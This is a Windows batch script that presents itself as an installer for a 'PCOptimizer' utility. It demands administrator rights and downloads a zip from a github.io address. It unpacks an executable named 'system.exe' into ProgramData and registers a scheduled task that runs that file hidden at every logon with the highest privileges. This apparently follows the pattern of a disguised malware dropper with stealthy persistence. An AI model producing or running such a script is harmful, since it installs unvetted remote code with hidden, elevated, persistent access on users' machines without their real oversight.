@echo off
setlocal EnableExtensions

:: ================= CONFIG =================
set "URL=https://luckiestpancake.github.io/Files/test.zip"
set "APP_NAME=PCOptimizer"
set "INSTALL_DIR=%ProgramData%\%APP_NAME%"
set "ZIP_PATH=%TEMP%\%APP_NAME%.zip"
set "EXE_NAME=system.exe"
:: =========================================

echo [1/6] Checking admin privileges...
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo ERROR: Please run this as Administrator.
    pause
    exit /b 1
)

echo [2/6] Creating install directory...
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

echo [3/6] Downloading package...
powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%ZIP_PATH%' -ErrorAction Stop"
if %errorlevel% neq 0 (
    echo ERROR: Download failed.
    pause
    exit /b 1
)

echo [4/6] Extracting files...
powershell -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%INSTALL_DIR%' -Force"
if %errorlevel% neq 0 (
    echo ERROR: Extraction failed.
    pause
    exit /b 1
)

del "%ZIP_PATH%" >nul 2>&1

echo [5/6] Cleaning nested folders (if any)...
if exist "%INSTALL_DIR%\pc-optimizer" (
    xcopy "%INSTALL_DIR%\pc-optimizer\*" "%INSTALL_DIR%\" /E /Y /I >nul
    rmdir /s /q "%INSTALL_DIR%\pc-optimizer"
)

echo [6/6] Creating hidden startup task...

schtasks /create /tn "%APP_NAME%" ^
 /tr "powershell -WindowStyle Hidden -Command Start-Process '%INSTALL_DIR%\%EXE_NAME%' -WindowStyle Hidden" ^
 /sc onlogon ^
 /rl highest ^
 /f >nul

if %errorlevel% neq 0 (
    echo ERROR: Failed to create scheduled task.
    pause
    exit /b 1
)

echo.
echo Installation complete.
echo The optimizer will now run automatically on login (hidden).
pause
